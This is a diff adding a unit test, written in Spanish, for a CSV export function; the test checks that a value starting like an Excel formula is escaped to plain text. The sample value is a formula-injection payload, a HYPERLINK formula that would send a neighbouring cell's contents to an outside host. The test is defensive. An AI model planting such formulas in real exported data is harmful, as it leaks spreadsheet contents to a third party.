@@ -19,6 +19,13 @@ describe("exportación con marca", () => {
     expect(csvExportacion(e, "X")).toContain('"Ana; Peña"');
   });
 
+  it("un dato que empieza como fórmula de Excel sale como texto", () => {
+    const peligrosa = { ...e, filas: [{ ...e.filas[0], nombre: '=HYPERLINK("https://x/?d="&B6,"ver")' }] };
+    const csv = csvExportacion(peligrosa, "X");
+    expect(csv).toContain(`"'=HYPERLINK(""https://x/?d=""&B6,""ver"")"`);
+    expect(csv).not.toMatch(/;=HYPERLINK/);
+  });
+
   it("el nombre del archivo lleva la referencia", () => {
     expect(nombreArchivoExportacion(e)).toBe("comando-exportacion-abcd1234.csv");
   });
